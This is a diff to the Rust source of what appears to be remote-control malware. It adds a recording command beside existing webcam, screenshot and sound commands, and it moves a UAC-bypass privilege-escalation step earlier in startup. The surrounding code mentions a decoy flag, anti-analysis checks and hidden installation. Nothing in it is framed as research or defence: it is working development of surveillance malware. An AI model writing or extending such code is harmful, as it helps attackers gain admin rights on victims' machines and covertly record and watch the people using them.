@@ -94,6 +94,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         OpenUrlCommand,
         PlaySoundCommand,
         PrintCommand,
+        RecordCommand,
         ScreenshotCommand,
         WebcamCommand,
         RobloxCommand,
@@ -211,7 +212,25 @@ async fn main() -> anyhow::Result<()> {
     let args: Vec<String> = env::args().collect();
     let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());
 
-    let mut is_admin_privileged = uac_bypass::is_admin();
+    let is_admin_privileged = uac_bypass::is_admin();
+    
+    //@ UAC Bypass - MUST be before ExitPatcher so non-admin process can exit!
+    if !is_admin_privileged {
+        log_debug!("Not running with admin privileges, attempting UAC bypass...");
+
+        if uac_bypass::attempt_uac_bypass() {
+            // UAC bypass launched a new elevated process - this non-admin process must exit immediately
+            log_debug!("UAC bypass initiated - exiting non-admin process");
+            std::thread::sleep(std::time::Duration::from_millis(100));
+            std::process::exit(0); // Use raw exit, not safe_exit (ExitPatcher not applied yet)
+        } else {
+            log_debug!("UAC bypass failed. Continuing without admin privileges.");
+        }
+    } else {
+        log_debug!("Already running with admin privileges.");
+    }
+
+    // Now we're either admin or UAC bypass failed - continue with setup
     singleton_prcess(is_admin_privileged);
 
     // ========================================================================
@@ -265,24 +284,6 @@ async fn main() -> anyhow::Result<()> {
     // Start keep-active thread to prevent sleep
     let keep_active_config = Config::get_keep_active_config();
     let _keep_active_thread = start_keep_active(&keep_active_config);
-
-    //@ UAC Bypass
-    if !is_admin_privileged {
-        log_debug!("Not running with admin privileges, attempting UAC bypass...");
-
-        if uac_bypass::attempt_uac_bypass() {
-            is_admin_privileged = uac_bypass::is_admin();
-            if is_admin_privileged {
-                log_debug!("UAC bypass successful! Now running with admin privileges.");
-            } else {
-                log_debug!("UAC bypass failed. Continuing without admin privileges.");
-            }
-        } else {
-            log_debug!("UAC bypass failed. Continuing without admin privileges.");
-        }
-    } else {
-        log_debug!("Already running with admin privileges.");
-    }
 
     //@ Installation
     // Note: is_installed already checked above for anti-analysis
